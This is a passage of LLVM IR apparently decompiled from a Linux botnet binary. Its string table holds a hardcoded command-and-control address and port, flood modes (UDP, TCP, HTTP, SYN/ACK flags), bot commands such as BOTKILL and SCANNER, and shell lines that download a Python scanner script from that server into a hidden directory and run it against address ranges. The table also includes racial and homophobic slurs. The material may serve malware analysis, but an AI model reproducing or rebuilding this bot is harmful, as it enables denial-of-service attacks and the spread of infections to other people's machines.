i32 0, i32 0), i8* getelementptr inbounds ([78 x i8], [78 x i8]* @global_var_806de7c.1435, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @global_var_806decc.1436, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @global_var_806df14.1437, i32 0, i32 0), i8* getelementptr inbounds ([79 x i8], [79 x i8]* @global_var_806df68.1438, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @global_var_806dfb8.1439, i32 0, i32 0), i8* getelementptr inbounds ([74 x i8], [74 x i8]* @global_var_806e000.1440, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @global_var_806e04c.1441, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @global_var_806e098.1442, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @global_var_806e0e0.1443, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @global_var_806e130.1444, i32 0, i32 0), i8* getelementptr inbounds ([51 x i8], [51 x i8]* @global_var_806e180.1445, i32 0, i32 0), i8* getelementptr inbounds ([51 x i8], [51 x i8]* @global_var_806e1b4.1446, i32 0, i32 0), i8* getelementptr inbounds ([72 x i8], [72 x i8]* @global_var_806e1e8.1447, i32 0, i32 0)]
@global_var_806e350.1452 = constant [62 x i8] c"%s %s HTTP/1.1\0D\0AConnection: %s\0D\0AAccept: */*\0D\0AUser-Agent: %s\0D\0A\00"
@global_var_806e38e.1453 = constant [6 x i8] c"arfgG\00"
@global_var_806e394.1454 = constant [9 x i8] c"HBiug655\00"
@global_var_806e39d.1455 = constant [13 x i8] c"KJYDFyljf754\00"
@global_var_806e3aa.1456 = constant [20 x i8] c"LIKUGilkut769458905\00"
@global_var_806e3be.1457 = constant [17 x i8] c"JHFDSkgfc5747694\00"
@global_var_806e3cf.1458 = constant [12 x i8] c"GJjyur67458\00"
@global_var_806e3db.1459 = constant [12 x i8] c"RYSDk747586\00"
@global_var_806e3e7.1460 = constant [12 x i8] c"HKJGi5r8675\00"
@global_var_806e3f3.1461 = constant [10 x i8] c"KHGK7985i\00"
@global_var_806e3fd.1462 = constant [11 x i8] c"yuituiILYF\00"
@global_var_806e408.1463 = constant [14 x i8] c"GKJDghfcjkgd4\00"
@global_var_806e416.1464 = constant [12 x i8] c"uygtfgtrevf\00"
@global_var_806e422.1465 = constant [13 x i8] c"tyeuhygbtfvg\00"
@global_var_806e42f.1466 = constant [9 x i8] c"ewqdcftr\00"
@global_var_806e438.1467 = constant [16 x i8] c"trbazetghhnbrty\00"
@global_var_806e448.1468 = constant [11 x i8] c"tbhrwsehbg\00"
@global_var_806e453.1469 = constant [12 x i8] c"twehgbferhb\00"
@global_var_806e45f.1470 = constant [12 x i8] c"etrbhhgetrb\00"
@global_var_806e46b.1471 = constant [14 x i8] c"edfverthbyrtb\00"
@global_var_806e479.1472 = constant [14 x i8] c"kmiujmnhnhfgn\00"
@global_var_806e487.1473 = constant [14 x i8] c"zcdbvgdfsbgfd\00"
@global_var_806e495.1474 = constant [10 x i8] c"gdfbtsdgb\00"
@global_var_806e49f.1475 = constant [14 x i8] c"ghdugffytsdyt\00"
@global_var_806e4ad.1476 = constant [14 x i8] c"tgerthgwtrwry\00"
@global_var_806e4bb.1477 = constant [12 x i8] c"yteytietyue\00"
@global_var_806e4c7.1478 = constant [9 x i8] c"qsortEQS\00"
@global_var_806e4d0.1479 = constant [16 x i8] c"8969876hjkghblk\00"
@global_var_806e4e0.1480 = constant [4 x i8] c"std\00"
@global_var_806e4e4.1481 = constant [4 x i8] c"dts\00"
@global_var_806e4e8.1482 = constant [6 x i8] c"hackz\00"
@global_var_806e4ee.1483 = constant [7 x i8] c"shdyed\00"
@global_var_806e4f5.1484 = constant [5 x i8] c"http\00"
@global_var_806e4fa.1485 = constant [10 x i8] c"sghwiondc\00"
@global_var_806e504.1486 = constant [7 x i8] c"nigger\00"
@global_var_806e50b.1487 = constant [6 x i8] c"pussy\00"
@global_var_806e511.1488 = constant [7 x i8] c"faggot\00"
@global_var_806e520.1489 = constant [36 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_806e38e.1453, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_806e394.1454, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_806e39d.1455, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @global_var_806e3aa.1456, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_806e3be.1457, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_806e3cf.1458, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_806e3db.1459, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_806e3e7.1460, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_806e3f3.1461, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_806e3fd.1462, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_806e408.1463, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_806e416.1464, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_806e422.1465, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_806e42f.1466, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_806e438.1467, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_806e448.1468, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_806e453.1469, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_806e45f.1470, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_806e46b.1471, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_806e479.1472, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_806e487.1473, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_806e495.1474, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_806e49f.1475, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_806e4ad.1476, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_806e4bb.1477, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_806e4c7.1478, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_806e4d0.1479, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_806e4e0.1480, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_806e4e4.1481, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_806e4e8.1482, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_806e4ee.1483, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_806e4f5.1484, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_806e4fa.1485, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_806e504.1486, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_806e50b.1487, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_806e511.1488, i32 0, i32 0)]
@global_var_806e5b0.1490 = constant [27 x i8] c"Failed opening raw socket.\00"
@global_var_806e5cc.1491 = constant [33 x i8] c"Failed setting raw headers mode.\00"
@global_var_806e5ed.1492 = constant [4 x i8] c"all\00"
@global_var_806e5f1.1493 = constant i32 2037579820
@global_var_806e5f3.1494 = constant [4 x i8] c"syn\00"
@global_var_806e5f7.1495 = constant [4 x i8] c"rst\00"
@global_var_806e5fb.1496 = constant [4 x i8] c"fin\00"
@global_var_806e5ff.1497 = constant [4 x i8] c"ack\00"
@global_var_806e603.1498 = constant [4 x i8] c"psh\00"
@global_var_806e607.1499 = constant [18 x i8] c"Invalid flag \22%s\22\00"
@global_var_806e619.1500 = constant [6 x i8] c"PONG!\00"
@global_var_806e61f.1501 = constant [11 x i8] c"GETLOCALIP\00"
@global_var_806e62a.1502 = constant [10 x i8] c"My IP: %s\00"
@global_var_806e634.1503 = constant [7 x i8] c"PYTHON\00"
@global_var_806e63b.1504 = constant [23 x i8] c"PYTHON RANGE [1,2,3,4]\00"
@global_var_806e652.1505 = constant [4 x i8] c"0FF\00"
@global_var_806e656.1506 = constant [16 x i8] c"pkill -9 python\00"
@global_var_806e666.1507 = constant [9 x i8] c"DOWNLOAD\00"
@global_var_806e670.1508 = constant [122 x i8] c"yum install python-paramiko -y;apt-get install python-paramiko -y;mkdir /.tmp;cd /.tmp;wget http://159.89.35.204/purge.py\00"
@global_var_806e6ea.1509 = constant [20 x i8] c"Installs For Python\00"
@global_var_806e6fe.1510 = constant i32 1684209713
@global_var_806e700.1511 = constant [39 x i8] c"cd /.tmp;python purge.py 500 SATAN 1 3\00"
@global_var_806e727.1512 = constant [27 x i8] c"Conncted To Python Scanner\00"
@global_var_806e742.1513 = constant i32 1684209714
@global_var_806e744.1514 = constant [40 x i8] c"cd /.tmp;python purge.py 500 B 49.144 3\00"
@global_var_806e76c.1515 = constant i32 51
@global_var_806e770.1516 = constant [39 x i8] c"cd /.tmp;python purge.py 500 B 122.3 3\00"
@global_var_806e797.1517 = constant [8 x i8] c"BOTKILL\00"
@global_var_806e79f.1518 = constant [13 x i8] c"Killing Bots\00"
@global_var_806e7ac.1519 = constant [7 x i8] c"LOOPME\00"
@global_var_806e7b3.1520 = constant [16 x i8] c"LOOPING PAYLOAD\00"
@global_var_806e7c3.1521 = constant [8 x i8] c"SCANNER\00"
@global_var_806e7cb.1522 = constant [17 x i8] c"SCANNER ON | OFF\00"
@global_var_806e7dc.1523 = constant [4 x i8] c"OFF\00"
@global_var_8078870.1524 = local_unnamed_addr global i32 0
@global_var_806e7e0.1525 = constant [5 x i8] c" OFF\00"
@global_var_806e7e5.1526 = constant [3 x i8] c"ON\00"
@global_var_806e7e8.1527 = constant [4 x i8] c"UDP\00"
@global_var_806e7ec.1528 = constant [5 x i8] c"HTTP\00"
@global_var_806e7f1.1529 = constant [4 x i8] c"STD\00"
@global_var_806e7f5.1530 = constant [4 x i8] c"TCP\00"
@global_var_806e7f9.1531 = constant [5 x i8] c"STOP\00"
@global_var_806e7fe.1532 = constant [12 x i8] c"HOODASSSHIT\00"
@global_var_80718f0.1533 = local_unnamed_addr global i32 -1
@global_var_80683e0.1534 = constant [18 x i8] c"159.89.35.204:775\00"
@global_var_8071840.1535 = global [18 x i8]* @global_var_80683e0.1534
@global_var_8071844.1536 = global i32 775
@global_var_806e80a.1537 = constant [8 x i8] c"8.8.8.8\00"
@global_var_806e812.1538 = constant [16 x i8] c"/proc/net/route\00"
@global_var_806e822.1539 = constant [11 x i8] c"\0900000000\09\00"
@global_var_806e82d.1541 = constant [16 x i8] c"/usr/bin/python\00"
@global_var_806e83d.1542 = constant [7 x i8] c"SERVER\00"
@global_var_806e844.1543 = constant [7 x i8] c"ROUTER\00"
@global_var_806e84b.1544 = constant i32 1752396544
@global_var_806e84c.1545 = constant [5 x i8] c"sshd\00"
@global_var_806e851.1546 = constant [19 x i8] c"/usr/sbin/dropbear\00"
@global_var_80718ec.1547 = local_unnamed_addr global i32 1
@global_var_806e864.1548 = constant [13 x i8] c"BUILD %s:%s\0A\00"
@global_var_806e871.1549 = constant i32 1430388783
@global_var_806e87c.1551 = constant i32 993024795
@global_var_806e8af.1552 = constant [5 x i8] c"PONG\00"
@global_var_806e8b4.1553 = constant [4 x i8] c"DUP\00"
@global_var_806e8b8.1554 = constant [5 x i8] c"MOVE\00"
@global_var_806e8bd.1555 = constant [8 x i8] c"%s 2>&1\00"
@1 = constant i32 2097266
@global_var_806e8c7.1557 = constant i32 32
@global_var_8071900 = external local_unnamed_addr global i32
@global_var_8071928.1560 = global i32 288
@global_var_807196c.1561 = local_unnamed_addr global i32 272
@global_var_8071920.1563 = global i32* @global_var_8071928.1560
@global_var_8075b6c.1564 = local_unnamed_addr global i32 0
@global_var_8075b68.1565 = local_unnamed_addr global i32 0
@global_var_8075b64.1566 = global i32 0
@global_var_8075b78.1567 = local_unnamed_addr global i32 0
@global_var_8075b74.1568 = local_unnamed_addr global i32 0
@global_var_8075b70.1569 = global i32 0
@global_var_806eecc.1570 = constant [6 x i8] c"(nil)\00"
@global_var_806eed2.1571 = constant [7 x i8] c"(null)\00"
@global_var_8077b84.1572 = global i32 0
@global_var_80719f4.1573 = local_unnamed_addr global i32* @global_var_8077b84.1572
@global_var_80719fe.1574 = global i32 0
@global_var_806018d.1575 = constant i32 -2062498685
@global_var_80788a0.1576 = global i32 0
@global_var_806eedc.1577 = constant i32 2949163
@global_var_806ef30.1579 = constant i32 327688
@global_var_806ef6c.1580 = constant [8 x i8] c" +0-#'I\00"
@global_var_806eef0.1581 = constant [9 x i8] c"hlLjztqZ\00"
@global_var_806ef54.1582 = constant [21 x i8] c"npxXoudifFeEgGaACScs\00"
@global_var_806ef23.1583 = constant i32 117506048
@global_var_806ef14.1584 = constant i32 331776
@global_var_8060839.1585 = constant i32 -1876652917
@global_var_8078878.1586 = local_unnamed_addr global i32 0
@global_var_806ef84.1587 = constant [8 x i8] c"Success\00"
@global_var_806ef74.1588 = constant [15 x i8] c"Unknown error \00"
@global_var_807009c.1589 = constant i32 65536
@global_var_8071afc.1590 = local_unnamed_addr global i32* @global_var_807009c.1589
@global_var_8077b90.1591 = global i32 0
@global_var_806fb60.1592 = constant [15 x i8] c"Resolver error\00"
@global_var_806fae6.1593 = constant [8 x i8] c"Error 0\00"
@global_var_806faee.1594 = constant [13 x i8] c"Unknown host\00"
@global_var_806fafb.1595 = constant [25 x i8] c"Host name lookup failure\00"
@global_var_806fb14.1596 = constant [21 x i8] c"Unknown server error\00"
@global_var_806fb29.1597 = constant [32 x i8] c"No address associated with name\00"
@global_var_806fb4c.1598 = constant [5 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_806fae6.1593, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_806faee.1594, i32 0, i32 0), i8* getelementptr inbounds ([25 x i8], [25 x i8]* @global_var_806fafb.1595, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @global_var_806fb14.1596, i32 0, i32 0), i8* getelementptr inbounds ([32 x i8], [32 x i8]* @global_var_806fb29.1597, i32 0, i32 0)]
@global_var_806fb49.1599 = constant [3 x i8] c": \00"
@global_var_806fb4b.1600 = constant i32 117106176
@global_var_806fade.1601 = constant [8 x i8] c"%s%s%s\0A\00"
@global_var_8077b94.1602 = global i32 0
@global_var_80788c8.1605 = global i32 0
@global_var_80719f8.1606 = global i32 0
@global_var_80788cc.1608 = global i32 0
@global_var_80788fc.1609 = global i32 0
@global_var_8078900.1610 = local_unnamed_addr global i32 0
@global_var_807890c.1611 = local_unnamed_addr global i32 0
@global_var_8078910.1612 = local_unnamed_addr global i32 0
@global_var_8078904.1613 = global i32 0
@global_var_8078c04.1614 = global i32 0
@global_var_8078c2c.1615 = local_unnamed_addr global i32 0
@global_var_8078c1c.1616 = local_unnamed_addr global i32 0
@global_var_8078c20.1617 = local_unnamed_addr global i32 0
@global_var_8078c24.1618 = local_unnamed_addr global i32 0
@global_var_8078c40.1619 = local_unnamed_addr global i32 0
@global_var_8078c28.1620 = local_unnamed_addr global i32 0
@global_var_8078c34.1621 = local_unnamed_addr global i32 0
@global_var_8078c38.1622 = local_unnamed_addr global i32 0
@global_var_8078c44.1623 = local_unnamed_addr global i32 0
@global_var_8078c18.1624 = local_unnamed_addr global i32 0
@global_var_8078c14.1626 = local_unnamed_addr global i32 0
@global_var_8078c3c.1627 = local_unnamed_addr global i32 0
@global_var_8071a10.1628 = global i32 0
@global_var_8071a28.1630 = global i32 0
@global_var_8071a40 = external global i32
@global_var_8071a58.1632 = global i32 -1726662223
@global_var_8071a48.1633 = local_unnamed_addr global i32* @global_var_8071a58.1632
@global_var_8071a44.1634 = global i32* @global_var_8071a58.1632
@global_var_8071ad4.1637 = global i32 0
@global_var_8077d74.1638 = local_unnamed_addr global i32 0
@global_var_80782c4.1639 = local_unnamed_addr global i32 0
@global_var_806fb7a.1640 = constant [11 x i8] c"/proc/stat\00"
@global_var_806fb4a.1641 = constant i32 -85589984
@global_var_806fb85.1642 = constant [14 x i8] c"/proc/cpuinfo\00"
@global_var_806fb93.1643 = constant [10 x i8] c"processor\00"
@global_var_806fbb8.1644 = constant i32 604672
@global_var_806fb9d.1646 = constant [24 x i8] c"/sys/devices/system/cpu\00"
@global_var_8078c4c.1647 = local_unnamed_addr global i32 0
@global_var_8062960.1648 = constant i32 1533543935
@global_var_8078c48.1649 = local_unnamed_addr global i32 0
@global_var_8077d78.1650 = global i32 0
@global_var_8077d7c.1651 = global i32 0
@global_var_80717f0.1652 = global i32 -1
@global_var_8063032.1653 = constant i32 -294069
@global_var_80782cc.1654 = local_unnamed_addr global i32 0
@global_var_80782d0.1655 = local_unnamed_addr global i32 0
@global_var_806ff80.1656 = constant [10 x i8] c"/dev/null\00"
@global_var_80782c8.1657 = local_unnamed_addr global i32 0
@global_var_80782c0.1658 = local_unnamed_addr global i32 0
@global_var_8070442 = external constant i32
@global_var_8071af0.1659 = local_unnamed_addr global i32* @global_var_8070442
@global_var_806323a.1660 = constant i32 1928542531
@global_var_806325e.1661 = constant i32 1928542531
@global_var_8078300.1662 = global i32 0
@global_var_80782fc.1663 = local_unnamed_addr global i32 0
@global_var_80782e8.1664 = global i32 0
@global_var_80782d4.1665 = global i32 0
@global_var_806ff8a.1666 = constant [8 x i8] c"/bin/sh\00"
@global_var_806ff95.1668 = constant [7 x i8] c"exit 0\00"
@global_var_8078840.1669 = local_unnamed_addr global i32 0
@global_var_807029c.1670 = constant i32 0
@global_var_80703fa.1671 = constant i32 1868824690
@global_var_8064154.1672 = constant i32 123436193
@global_var_8075b7c.1673 = local_unnamed_addr global i32 0
@global_var_8064207.1674 = constant i32 123434145
@global_var_8075b80.1675 = local_unnamed_addr global i32 0
@global_var_8071924.1676 = local_unnamed_addr global i32 2
@global_var_8064570.1677 = constant i32 1534330367
@global_var_80645a3.1678 = constant i32 119087265
@global_var_80702c0.1680 = constant [4 x i8] c"inf\00"
@global_var_80702c3.1685 = constant i32 1179535616
@global_var_80702d0.1686 = constant i32 2883630
@global_var_80650b9.1687 = constant i32 1534856587
@global_var_8065103.1688 = constant i32 1533543935
@global_var_8065223.1689 = constant i32 123436193
@global_var_8065287.1690 = constant i32 123431073
@global_var_8078c5c.1691 = local_unnamed_addr global i32 0
@global_var_8078c50.1692 = local_unnamed_addr global i32 0
@global_var_8078c54.1693 = local_unnamed_addr global i32 0
@global_var_8078c58.1694 = local_unnamed_addr global i32 0
@global_var_8078c6c.1695 = local_unnamed_addr global i32 0
@global_var_8078504.1696 = global i32 0
@global_var_8078c60.1697 = local_unnamed_addr global i32 0
@global_var_8078c70.1698 = local_unnamed_addr global i32 0
@global_var_8078c74.1699 = local_unnamed_addr global i32 0
@global_var_8078304.1700 = local_unnamed_addr global i32 0
@global_var_8078314.1701 = local_unnamed_addr global i32 0
@global_var_8078318.1702 = local_unnamed_addr global i32 0
@global_var_8078834.1703 = local_unnamed_addr global i32 0
@global_var_807830c.1704 = global i32 0
@global_var_807882c.1705 = local_unnamed_addr global i32 0
@global_var_8078828.1706 = local_unnamed_addr global i32 0
@global_var_8078820.1707 = local_unnamed_addr global i32 0
@global_var_8078824.1708 = local_unnamed_addr global i32 0
@global_var_8078838.1709 = local_unnamed_addr global i32 0
@global_var_8078520.1710 = local_unnamed_addr global i32 0
@global_var_807880c.1711 = global i32 0
@global_var_80703cc.1712 = constant [17 x i8] c"0123456789abcdef\00"
@global_var_80703c9.1713 = constant [3 x i8] c"%x\00"
@global_var_8078848.1714 = global i32 0
@global_var_8078c88.1715 = local_unnamed_addr global i32 0
@global_var_8078c7c.1716 = local_unnamed_addr global i32 0
@global_var_8078844.1718 = local_unnamed_addr global i32 0
@global_var_8078c80.1720 = local_unnamed_addr global i32 0
@global_var_8078c78.1722 = local_unnamed_addr global i32 0
@global_var_80703e0.1723 = constant [17 x i8] c"/etc/resolv.conf\00"
@global_var_8078860.1724 = local_unnamed_addr global i32 0
@global_var_80703f1.1725 = constant [11 x i8] c"nameserver\00"
@global_var_80703fc.1726 = constant [7 x i8] c"domain\00"
@global_var_8070403.1727 = constant [7 x i8] c"search\00"
@global_var_807040a.1728 = constant [8 x i8] c"options\00"
@global_var_8070412.1729 = constant [8 x i8] c"timeout\00"
@global_var_807041a.1730 = constant [9 x i8] c"attempts\00"
@global_var_8070424.1731 = constant i32 889192450
@global_var_8070434.1732 = constant [11 x i8] c"/etc/hosts\00"
@global_var_807043f.1733 = constant [4 x i8] c"# \09\00"
@global_var_80717ec.1734 = global i32 0
@global_var_8071b20.10 = local_unnamed_addr global i8 0
@global_var_8071b40.30 = external local_unnamed_addr global i8*
@global_var_8071b58.39 = local_unnamed_addr global i8 0
@global_var_8071b59.40 = local_unnamed_addr global i8 0
@global_var_8071b50.1540 = external global i8*
@global_var_806ef48.1578 = external constant i8*
@global_var_80788d0.1607 = global i8 0
@global_var_8078c30.1625 = local_unnamed_addr global i8 0
@global_var_8077d70.1629 = local_unnamed_addr global i8 0
@global_var_806fb75.1635 = external constant i8*
@global_var_806fb70.1636 = external constant i8*
@2 = internal constant [2 x i8] c"\03\00"
@global_var_8071b09 = global i8* getelementptr inbounds ([2 x i8], [2 x i8]* @2, i32 0, i32 0)
@global_var_8071b04.1717 = local_unnamed_addr global i16 1
@global_var_8078c84.1719 = local_unnamed_addr global i64 0
@global_var_8071b08.1721 = external global i64
@global_var_806e8c5.1556 = constant [2 x i8] c"r\00"

declare void @__pseudo_call(i32) local_unnamed_addr

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  %v0_80480b7 = load i32, i32* @ebx, align 4
  %v1_80480b8 = call i32 @__get_pc_thunk_bx(i32 %v0_80480b7)
  %v0_80480bd = load i32, i32* @ebx, align 4
  %v1_80480bd = add i32 %v0_80480bd, 169799
  store i32 %v1_80480bd, i32* @ebx, align 4
  %v0_80480c3 = call i32 @frame_dummy()
  %v0_80480c8 = call i32 @__do_global_ctors_aux()
  ret i32 %v0_80480c8
}

define i32 @__get_pc_thunk_bx(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @ebx, align 4
  %v0_80480d3 = load i32, i32* @eax, align 4
  ret i32 %v0_80480d3
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %v0_80480e6 = load i8, i8* @global_var_8071b20.10, align 32
  %v1_80480e6 = icmp eq i8 %v0_80480e6, 0
  br i1 %v1_80480e6, label %dec_label_pc_80480fb.preheader, label %entry.dec_label_pc_8048122_crit_edge

entry.dec_label_pc_8048122_crit_edge:             ; preds = %entry
  %v0_8048123.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8048122

dec_label_pc_80480fb.preheader:                   ; preds = %entry
  %v0_80480fb1 = load i32, i32* bitcast (i32** @global_var_8071824.12 to i32*), align 4
  %v1_80481022 = icmp eq i32 %v0_80480fb1, 0
  %v1_80481049 = icmp eq i1 %v1_80481022, false
  br i1 %v1_80481049, label %dec_label_pc_80480f1.lr.ph, label %dec_label_pc_8048106

dec_label_pc_80480f1.lr.ph:                       ; preds = %dec_label_pc_80480fb.preheader
  br label %dec_label_pc_80480f1

dec_label_pc_80480f1:                             ; preds = %dec_label_pc_80480f1.lr.ph, %dec_label_pc_80480f1
  %v0_80480f1 = phi i32 [ %v0_80480fb1, %dec_label_pc_80480f1.lr.ph ], [ %v0_80480fb, %dec_label_pc_80480f1 ]
  %v1_80480f1 = add i32 %v0_80480f1, 4
  store i32 %v1_80480f1, i32* bitcast (i32** @global_var_8071824.12 to i32*), align 4
  call void @__pseudo_call(i32 %v0_80480f1)
  %v0_80480fb = load i32, i32* bitcast (i32** @global_var_8071824.12 to i32*), align 4
  %v1_8048102 = icmp eq i32 %v0_80480fb, 0
  %v1_8048104 = icmp eq i1 %v1_8048102, false
  br i1 %v1_8048104, label %dec_label_pc_80480f1, label %dec_label_pc_80480fb.dec_label_pc_8048106_crit_edge

dec_label_pc_80480fb.dec_label_pc_8048106_crit_edge: ; preds = %dec_label_pc_80480f1
  br label %dec_label_pc_8048106

dec_label_pc_8048106:                             ; preds = %dec_label_pc_80480fb.dec_label_pc_8048106_crit_edge, %dec_label_pc_80480fb.preheader
  store i8 1, i8* @global_var_8071b20.10, align 32
  br label %dec_label_pc_8048122

dec_label_pc_8048122:                             ; preds = %entry.dec_label_pc_8048122_crit_edge, %dec_label_pc_8048106
  %v0_8048123 = phi i32 [ %v0_8048123.pre, %entry.dec_label_pc_8048122_crit_edge ], [ 0, %dec_label_pc_8048106 ]
  ret i32 %v0_8048123

; uselistorder directives
  uselistorder i32 %v0_80480fb, { 1, 0 }
  uselistorder i32 %v0_80480f1, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_8071824.12 to i32*), { 1, 2, 0 }
  uselistorder i8* @global_var_8071b20.10, { 1, 0 }
  uselistorder label %dec_label_pc_8048122, { 1, 0 }
  uselistorder label %dec_label_pc_80480f1, { 1, 0 }
}

define i32 @frame_dummy() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8048130 = load i32, i32* @ebp, align 4
  store i32 %v0_8048130, i32* %stack_var_-4, align 4
  %v4_8048130 = ptrtoint i32* %stack_var_-4 to i32
  store i32 0, i32* @eax, align 4
  store i32 %v4_8048130, i32* @ebp, align 4
  %v0_804813b = call i32 @function_8048140()
  ret i32 %v0_804813b

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @function_8048140() local_unnamed_addr {
dec_label_pc_8048140:
  %v0_8048147 = load i32, i32* @eax, align 4
  %v1_8048147 = icmp eq i32 %v0_8048147, 0
  br i1 %v1_8048147, label %dec_label_pc_804816b, label %dec_label_pc_804814b

dec_label_pc_804814b:                             ; preds = %dec_label_pc_8048140
  %v1_8048166 = call i32 @__libc_errno(i32 ptrtoint (i32* @global_var_8071000.13 to i32))
  br label %dec_label_pc_804816b

dec_label_pc_804816b:                             ; preds = %dec_label_pc_8048140, %dec_label_pc_804814b
  %v0_804816b = load i32, i32* @global_var_8071800.15, align 2048
  %v1_8048170 = icmp eq i32 %v0_804816b, 0
  br i1 %v1_8048170, label %dec_label_pc_8048186, label %dec_label_pc_8048174

dec_label_pc_8048174:                             ; preds = %dec_label_pc_804816b
  br label %dec_label_pc_8048186

dec_label_pc_8048186:                             ; preds = %dec_label_pc_8048174, %dec_label_pc_804816b
  ret i32 0

; uselistorder directives
  uselistorder label %dec_label_pc_804816b, { 1, 0 }
}

define i32 @_start(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  store i32 %arg1, i32* @esi, align 4
  %v0_8048190 = load i32, i32* @eax, align 4
  store i32 %v0_8048190, i32* %stack_var_-4, align 4
  %v4_8048190 = ptrtoint i32* %stack_var_-4 to i32
  %v0_8048192 = load i32, i32* @edx, align 4
  %v9_80481a4 = call i32 @__uClibc_main(i32 134605997, i32 %arg1, i32* nonnull %stack_var_4, i32 134512820, i32 134644652, i32 %v0_8048192, i32 %v4_8048190, i32 %v0_8048190)
  ret i32 %v9_80481a4

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @init_rand(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @global_var_8071b60.16, align 32
  %v1_80481bd = add i32 %arg1, -1640531527
  store i32 %v1_80481bd, i32* @global_var_8071b64.17, align 4
  %v1_80481ca = add i32 %arg1, 1013904242
  store i32 %v1_80481ca, i32* %eax.global-to-local, align 4
  store i32 %v1_80481ca, i32* @global_var_8071b68.18, align 8
  br label %dec_label_pc_80481dd

dec_label_pc_80481dd:                             ; preds = %entry, %dec_label_pc_80481dd
  %storemerge5 = phi i32 [ 3, %entry ], [ %v4_804820d, %dec_label_pc_80481dd ]
  %v1_80481e3 = add nsw i32 %storemerge5, -3
  store i32 %v1_80481e3, i32* %eax.global-to-local, align 4
  %v1_80481e6 = mul nuw nsw i32 %v1_80481e3, 4
  %v2_80481e6 = add i32 %v1_80481e6, ptrtoint (i32* @global_var_8071b60.16 to i32)
  %v3_80481e6 = inttoptr i32 %v2_80481e6 to i32*
  %v4_80481e6 = load i32, i32* %v3_80481e6, align 4
  %v1_80481f0 = add nsw i32 %storemerge5, -2
  store i32 %v1_80481f0, i32* %eax.global-to-local, align 4
  %v1_80481f3 = mul nuw nsw i32 %v1_80481f0, 4
  %v2_80481f3 = add i32 %v1_80481f3, ptrtoint (i32* @global_var_8071b60.16 to i32)
  %v3_80481f3 = inttoptr i32 %v2_80481f3 to i32*
  %v4_80481f3 = load i32, i32* %v3_80481f3, align 4
  %v2_80481fa = xor i32 %v4_80481f3, %v4_80481e6
  %v2_80481ff = xor i32 %storemerge5, -1640531527
